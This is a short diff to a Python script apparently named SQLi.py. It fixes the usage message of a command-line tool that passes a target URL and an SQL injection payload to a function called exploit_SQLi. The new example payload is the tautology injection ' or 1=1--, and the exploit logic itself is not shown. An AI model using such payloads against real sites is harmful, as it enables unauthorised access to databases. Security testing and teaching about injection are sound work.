@@ -25,8 +25,8 @@ if __name__ == "__main__":
         url = sys.argv[1].strip()
         sqli_payload = sys.argv[2].strip()
     except IndexError:
-        print('Usage : python SQLi.py <url><SQLi_Payload>')
-        print('Example : python SQLi.py example.com 1=1\'')
+        print('Usage : python SQLi.py <url> <SQLi_Payload>')
+        print('Example : python SQLi.py example.com \' or 1=1--')
 
 
 if exploit_SQLi(url, sqli_payload) :
